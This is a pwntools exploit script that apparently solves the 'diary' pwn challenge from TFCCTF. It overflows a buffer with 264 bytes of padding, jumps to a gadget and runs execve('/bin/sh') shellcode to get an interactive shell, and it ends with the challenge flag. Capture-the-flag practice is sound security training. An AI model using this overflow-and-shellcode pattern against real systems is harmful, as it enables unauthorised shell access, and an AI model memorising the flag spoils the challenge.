#!/usr/bin/python3

from pwn import *

exe = ELF('diary', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x00000000004012af

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.tfcctf.com', 31146)
else:
        p = process(exe.path)

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    ''', arch='amd64'
)
GDB()

payload = b""
payload = payload.ljust(264) 
payload += p64(0x000000000040114a)
payload += shellcode
sl(payload)
p.interactive()
# TFCCTF{94fa3e5538d57f71937a85076e96fbc5c00f8fddbbcbb8b4b6db1df9e599d1d6}